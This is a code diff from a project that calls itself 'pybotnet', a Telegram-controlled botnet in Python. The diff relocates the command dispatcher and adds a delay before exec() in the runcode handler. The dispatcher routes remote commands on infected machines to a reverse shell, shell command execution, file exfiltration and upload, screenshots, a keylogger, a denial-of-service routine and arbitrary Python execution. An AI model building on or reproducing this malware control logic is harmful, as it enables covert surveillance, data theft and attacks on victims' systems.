@@ -59,6 +59,74 @@ scripts_name = {
     "runcode":          "`runcode <code>` Will run given python code. This function cant return values.",
 }
 
+def execute_scripts(command: str, pybotnet_up_time: int, ADMIN_CHAT_ID: str,
+                    TELEGRAM_TOKEN: str, previous_update_id: List[int], logger):
+    command_name = get_command_name(command)
+    try:
+        if is_command(command):
+
+            if command_name == MAC_ADDRES:
+                '''run command just on this system'''
+                logger.info('delete mac addres and run command ')
+                new_command = ' '.join(split_command(command)[1:])
+                return execute_scripts(
+                    new_command, pybotnet_up_time,
+                    ADMIN_CHAT_ID, TELEGRAM_TOKEN,
+                    previous_update_id, logger)
+
+            elif command_name == 'do_sleep':
+                return execute_do_sleep(command, logger)
+
+            elif command_name in ['get_info', 'info']:
+                return get_info(pybotnet_up_time, logger)
+
+            elif command_name == 'cmd':
+                return execute_cmd(command, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger, withThread=True)
+
+            elif command_name == 'ls':
+                return execute_ls(command, logger)
+
+            elif command_name == 'cd':
+                return execute_cd(command, logger)
+
+            elif command_name == 'export_file':
+                return execute_download_manager(command, logger)
+
+            elif command_name == 'import_file':
+                return execute_upload_manager(command, logger)
+
+            elif command_name == 'screenshot':
+                return screenshot(logger)
+
+            elif command_name in ['help', '/start']:
+                return command_help(logger)
+
+            elif command_name in ['reverse_shell']:
+                return reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
+
+            elif command_name == "keylogger" and split_command(command)[1] in ['start', 'stop']:
+                return keylogger(logger, command)
+
+            elif command_name == "schedule" and split_command(command)[1] in ["start", "stop", "list"]:
+                return scheduler_script(logger, command)
+
+            elif command_name == "playsound":
+                return playsound_pybotnet(logger, command)
+
+            elif command_name == "openurl":
+                return openurl(logger, command)
+
+            elif command_name == "dos":
+                return dos(logger, command)
+
+            elif command_name == "runcode":
+                return runcode(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id,logger, command)
+        logger.error('execute_scripts invalid command; Wrong format')
+        return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
+
+    except Exception as error:
+        return f'execute_scripts error: {error}'
+
 
 def split_command(command: str) -> list:
     '''split string by space'''
@@ -545,6 +613,7 @@ def exec_runner(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id,logger,command
     code = ' '.join(split_command(command)[1:])
     logger.info(f"Trying to run {code}")
     try:
+        sleep(5) # So that the runcode message deliver first.
         exec(command)
         send_message("Executed Successfully")
     except Exception as error:
@@ -580,70 +649,3 @@ Pybotnet Version:{settings.pybotnet_version}
 for more help, see: {settings.pybotnet_github_link}'''
 
 
-def execute_scripts(command: str, pybotnet_up_time: int, ADMIN_CHAT_ID: str,
-                    TELEGRAM_TOKEN: str, previous_update_id: List[int], logger):
-    command_name = get_command_name(command)
-    try:
-        if is_command(command):
-
-            if command_name == MAC_ADDRES:
-                '''run command just on this system'''
-                logger.info('delete mac addres and run command ')
-                new_command = ' '.join(split_command(command)[1:])
-                return execute_scripts(
-                    new_command, pybotnet_up_time,
-                    ADMIN_CHAT_ID, TELEGRAM_TOKEN,
-                    previous_update_id, logger)
-
-            elif command_name == 'do_sleep':
-                return execute_do_sleep(command, logger)
-
-            elif command_name in ['get_info', 'info']:
-                return get_info(pybotnet_up_time, logger)
-
-            elif command_name == 'cmd':
-                return execute_cmd(command, ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger, withThread=True)
-
-            elif command_name == 'ls':
-                return execute_ls(command, logger)
-
-            elif command_name == 'cd':
-                return execute_cd(command, logger)
-
-            elif command_name == 'export_file':
-                return execute_download_manager(command, logger)
-
-            elif command_name == 'import_file':
-                return execute_upload_manager(command, logger)
-
-            elif command_name == 'screenshot':
-                return screenshot(logger)
-
-            elif command_name in ['help', '/start']:
-                return command_help(logger)
-
-            elif command_name in ['reverse_shell']:
-                return reverse_shell(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
-
-            elif command_name == "keylogger" and split_command(command)[1] in ['start', 'stop']:
-                return keylogger(logger, command)
-
-            elif command_name == "schedule" and split_command(command)[1] in ["start", "stop", "list"]:
-                return scheduler_script(logger, command)
-
-            elif command_name == "playsound":
-                return playsound_pybotnet(logger, command)
-
-            elif command_name == "openurl":
-                return openurl(logger, command)
-
-            elif command_name == "dos":
-                return dos(logger, command)
-
-            elif command_name == "runcode":
-                return runcode(ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id,logger, command)
-        logger.error('execute_scripts invalid command; Wrong format')
-        return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
-
-    except Exception as error:
-        return f'execute_scripts error: {error}'
